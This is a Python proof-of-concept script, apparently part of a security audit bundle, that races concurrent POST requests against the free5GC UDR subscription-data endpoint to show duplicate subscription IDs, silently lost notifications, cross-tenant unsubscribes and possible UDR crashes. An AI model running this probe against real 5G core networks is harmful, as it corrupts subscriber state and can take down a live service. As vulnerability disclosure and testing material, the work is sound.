#!/usr/bin/env python3
"""
udr_subsid_collision.py -- the SILENT-CORRUPTION half of F35.

The F35 crash runs (run2/run3/run4 in this bundle) prove the unsynchronised UDR
subscription maps abort the process. This probe demonstrates the *other*
consequence of the very same missing lock, which needs no crash at all and
therefore leaves no log signature:

  free5GC v4.2.3, NFs/udr v1.4.4 (commit b649f90d)
  internal/sbi/processor/subs_to_notify_collection.go:28-30

      28: newSubscriptionID := strconv.Itoa(udrSelf.SubscriptionDataSubscriptionIDGenerator)
      29: udrSelf.SubscriptionDataSubscriptions[newSubscriptionID] = &SubscriptionDataSubscriptions
      30: udrSelf.SubscriptionDataSubscriptionIDGenerator++

  This is a non-atomic read-modify-write of a shared counter followed by an
  unsynchronised map write, executed once per inbound POST with no lock held.
  Compare internal/context/context.go:220-229, where the *policy-data* twin was
  fixed in v1.4.4 by wrapping the identical three statements in
  context.mtx.Lock()/defer Unlock(). The subscription-data path got no such
  treatment -- `git diff v1.4.3 v1.4.4` does not touch this file at all.

Two concurrent POSTs that both read the generator before either increments it
receive the SAME subsId. Both get `201 Created` with a `Location` header naming
that subsId, so both callers believe they own a distinct subscription. The
second map write overwrites the first, so:

  * the first subscriber's callbackReference is silently discarded and it will
    NEVER receive the onDataChangeNotify it subscribed for (TS 29.503
    Nudr_DataChangeNotify), with no error reported to it;
  * a subsequent DELETE of that subsId by either party removes the *other*
    party's subscription -- cross-tenant unsubscribe;
  * the UDR returns a Location URI that does not uniquely identify a resource,
    violating TS 29.505 / the Nudr_DR OpenAPI contract.

Detection is purely from the outside, using only the HTTP responses, so the
probe does not depend on reading the UDR's memory or logs:

  duplicates = (number of 201 responses) - (number of distinct subsIds returned)

Any value > 0 is proof. We additionally report max(subsId) vs the number of
201s: because the counter is bumped non-atomically, a raced run allocates fewer
distinct IDs than it issued responses for.

The probe deliberately uses a MODEST concurrency so that the process usually
survives long enough to answer -- the point is to show the corruption happens on
a UDR that is still up and still serving, i.e. it is invisible to any
liveness/health monitoring. If the UDR does abort (F35's crash arm), the probe
reports that too and exits 3 rather than pretending nothing happened.

Usage:
  udr_subsid_collision.py --target 10.100.200.11 --port 8000
  udr_subsid_collision.py --target <ip> --port 8000 --concurrency 24 --rounds 30
  udr_subsid_collision.py ... --path policy     # exercise the LOCKED twin, as a control

Exit codes: 0 = collision observed, 1 = no collision, 2 = error, 3 = UDR died.
"""

import argparse
import http.client
import json
import re
import sys
import threading
import time

SUBSDATA_PATH = "/nudr-dr/v2/subscription-data/subs-to-notify"   # UNLOCKED (the bug)
POLICY_PATH = "/nudr-dr/v2/policy-data/subs-to-notify"          # LOCKED in v1.4.4 (control)

# A body that genuinely deserialises: v1.4.4 fixed the fail-open path, so a
# malformed body is now rejected with 400 and never reaches the map write. These
# are the TS 29.505 mandatory fields for SubscriptionDataSubscriptions.
SUBSDATA_BODY = json.dumps({
    "nfInstanceID": "00000000-0000-0000-0000-000000000000",
    "plmnId": {"mcc": "208", "mnc": "93"},
    "callbackReference": "http://127.0.0.1:9/never",
    "monitoringEventIds": [],
}).encode()

POLICY_BODY = json.dumps({
    "notificationUri": "http://127.0.0.1:9/never",
    "monitoredResourceUris": ["http://127.0.0.1:9/x"],
    "contextIdList": [],
    "nfTypeList": [],
    "supportedFeatures": "FFFF",
}).encode()

LOC_RE = re.compile(r"/subs-to-notify/([^/?#]+)")


def one_request(host, port, path, body, out, idx):
    """Fire a single POST and record (status, subsId-from-Location)."""
    try:
        c = http.client.HTTPConnection(host, port, timeout=15)
        c.request("POST", path, body=body,
                  headers={"Content-Type": "application/json",
                           "Content-Length": str(len(body))})
        r = c.getresponse()
        loc = r.getheader("Location") or ""
        r.read()
        c.close()
        m = LOC_RE.search(loc)
        out[idx] = (r.status, m.group(1) if m else None)
    except Exception as e:                       # noqa: BLE001 - report and carry on
        out[idx] = (None, "ERR:%s" % e.__class__.__name__)


def probe(host, port, path, body, concurrency, rounds, settle):
    created, ids, errors, statuses = 0, [], 0, {}
    for rd in range(rounds):
        out = [None] * concurrency
        ths = []
        for i in range(concurrency):
            t = threading.Thread(target=one_request, args=(host, port, path, body, out, i))
            t.daemon = True
            ths.append(t)
        for t in ths:
            t.start()
        for t in ths:
            t.join()
        for st, sid in out:
            statuses[st] = statuses.get(st, 0) + 1
            if st == 201:
                created += 1
                if sid is not None:
                    ids.append(sid)
            elif st is None:
                errors += 1
        time.sleep(settle)
    return created, ids, errors, statuses


def liveness(host, port, path):
    try:
        c = http.client.HTTPConnection(host, port, timeout=5)
        c.request("GET", path)
        r = c.getresponse()
        r.read()
        c.close()
        return r.status
    except Exception:                            # noqa: BLE001
        return None


def main():
    ap = argparse.ArgumentParser(description="F35 silent-corruption probe: "
                                             "duplicate subsId allocation in the free5GC UDR")
    ap.add_argument("--target", default="10.100.200.11", help="UDR SBI IPv4 (default 10.100.200.11)")
    ap.add_argument("--port", type=int, default=8000, help="UDR SBI port (default 8000)")
    ap.add_argument("--path", choices=["subsdata", "policy"], default="subsdata",
                    help="subsdata = the UNLOCKED map (the bug); policy = the v1.4.4-LOCKED twin (control)")
    ap.add_argument("--concurrency", type=int, default=24,
                    help="parallel POSTs per round (default 24; kept modest so the UDR usually survives)")
    ap.add_argument("--rounds", type=int, default=30, help="rounds to fire (default 30)")
    ap.add_argument("--settle", type=float, default=0.02, help="sleep between rounds (default 0.02s)")
    a = ap.parse_args()

    path = SUBSDATA_PATH if a.path == "subsdata" else POLICY_PATH
    body = SUBSDATA_BODY if a.path == "subsdata" else POLICY_BODY

    pre = liveness(a.target, a.port, path)
    if pre is None:
        print("ERROR: UDR SBI at %s:%d is not reachable" % (a.target, a.port))
        return 2
    print("=== udr_subsid_collision ===")
    print("target        : %s:%d" % (a.target, a.port))
    print("path          : %s" % path)
    print("map           : %s" % ("SubscriptionDataSubscriptions (NO lock anywhere)"
                                 if a.path == "subsdata"
                                 else "PolicyDataSubscriptions (locked by v1.4.4 CreatePolicyDataSubscription)"))
    print("concurrency   : %d" % a.concurrency)
    print("rounds        : %d" % a.rounds)
    print("pre-probe GET : HTTP %s" % pre)

    t0 = time.time()
    created, ids, errors, statuses = probe(a.target, a.port, path, body,
                                          a.concurrency, a.rounds, a.settle)
    elapsed = time.time() - t0

    distinct = len(set(ids))
    dupes = created - distinct
    numeric = sorted(int(x) for x in ids if x.isdigit())
    post = liveness(a.target, a.port, path)

    print()
    print("--- result ---")
    print("status tally  : %s" % ", ".join("%s x %s" % (v, k) for k, v in
                                          sorted(statuses.items(), key=lambda kv: str(kv[0]))))
    print("201 Created   : %d" % created)
    print("transport err : %d" % errors)
    print("distinct subsId returned in Location headers : %d" % distinct)
    print("DUPLICATE subsId allocations (201s - distinct) : %d" % dupes)
    if numeric:
        print("subsId range  : %d .. %d  (span %d, expected %d if no ID was ever reused)"
              % (numeric[0], numeric[-1], numeric[-1] - numeric[0] + 1, created))
        # which IDs were handed out more than once
        seen, repeated = set(), []
        for x in ids:
            if x in seen and x not in repeated:
                repeated.append(x)
            seen.add(x)
        if repeated:
            show = ", ".join(repeated[:20])
            print("subsIds issued to 2+ subscribers : %d (first 20: %s)"
                  % (len(repeated), show))
    print("elapsed       : %.2fs" % elapsed)
    print("post-probe GET: HTTP %s" % post)

    if post is None:
        print()
        print("NOTE: the UDR aborted during the probe -- that is F35's crash arm, "
              "not a probe failure.")
        print("VERDICT: UDR DIED (see run_f35.sh for the crash evidence)")
        return 3

    if dupes > 0:
        print()
        print("VERDICT: COLLISION CONFIRMED -- %d subscribers were handed a subsId that" % dupes)
        print("         another subscriber also holds. The later map write silently")
        print("         overwrote the earlier one, so those subscriptions will never")
        print("         receive their Nudr_DataChangeNotify. No crash, no error, no log.")
        return 0

    print()
    print("VERDICT: no duplicate subsId observed in this sample")
    print("         (a non-atomic counter is still a latent race; absence of a")
    print("          collision in %d samples is not evidence of synchronisation)" % created)
    return 1


if __name__ == "__main__":
    sys.exit(main())
